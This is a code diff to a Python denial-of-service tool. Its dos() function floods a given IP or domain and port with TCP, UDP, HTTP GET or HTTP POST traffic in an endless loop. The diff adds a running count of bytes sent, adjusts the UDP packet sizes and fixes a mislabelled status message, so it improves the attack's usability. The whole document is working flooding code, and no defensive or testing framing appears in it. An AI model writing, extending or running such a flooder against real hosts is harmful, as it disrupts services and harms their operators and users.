@@ -8,6 +8,8 @@ SUPPORTED_ACTIONS = ("tcp", "s-tcp", "l-tcp", "udp", "s-udp", "l-udp", "http-get
 IP_PATTERN = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):([1-9]\d*|0)$'
 DOMAIN_PATTERN = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}:([1-9]\d*|0)$'
 
+sent_bytes = 0
+
 def help(msg: str = ""):
     print(f"""\
 Usage: {sys.argv[0]} [{", ".join(SUPPORTED_ACTIONS)}] <ip/domain>:<port>
@@ -46,14 +48,16 @@ def parse_argv(argv: list) -> tuple[str, list[tuple[str, int]]]:
     return action, targets
 
 def cycle(func, counter: int, startfrom = 0, prefix="  "):
+    global sent_bytes
     try:
         sent = startfrom
         while 1:
-            func()
+            packet = func()
             sent += 1
+            sent_bytes += packet.__sizeof__()
 
             if sent % counter == 0:
-                print(f"{prefix}Sent {sent} packets")
+                print(f"{prefix}Sent {sent} packets. Sent {sent_bytes/1024/1024:.3f} mB")
                 prefix = "  "
     except KeyboardInterrupt:
         print(f"\nStopping... ({target[0]})")
@@ -92,25 +96,29 @@ def dos(target: tuple[str, int], method: str):
                 s.connect((ip, target[1]))
                 s.sendall(packet)
                 s.close()
+                return packet
             cycle(tcp, 1 if method=="l-tcp" else (5 if method=="tcp" else 10))
         case "udp" | "s-udp" | "l-udp":
-            packet = ("A"*1024*24).encode("ascii") if method == "udp" else ("A" * 2048).encode("ascii")
-            packet = ("A"*1024*6).encode("ascii") if method == "l-udp" else packet
+            packet = ("A"*4096).encode("ascii") if method == "udp" else ("A" * 2048).encode("ascii")
+            packet = ("A"*1024*8).encode("ascii") if method == "l-udp" else packet
             print(f"Sending UDP Packets. Mode: {"Large" if method=="l-udp" else ("Normal" if method=="udp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
             def udp():
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.sendto(packet, (ip, target[1]))
                 s.close()
+                return packet
             cycle(udp, 500 if method=="l-udp" else (1000 if method=="udp" else 2000))
         case "http-get":
             print(f"Sending HTTP Requests. Mode: GET")
             def get():
                 requests.get(f"http://{ip}:{target[1]}", data={"A"*128 : "A"*256})
+                return {"A"*128 : "A"*256}
             cycle(get, 10)
         case "http-post":
-            print(f"Sending HTTP Requests. Mode: GET")
+            print(f"Sending HTTP Requests. Mode: POST")
             def post():
                 requests.post(f"http://{ip}:{target[1]}", data={"A"*1024 : "A"*1024})
+                return {"A"*1024 : "A"*1024}
             cycle(post, 10)
 
 
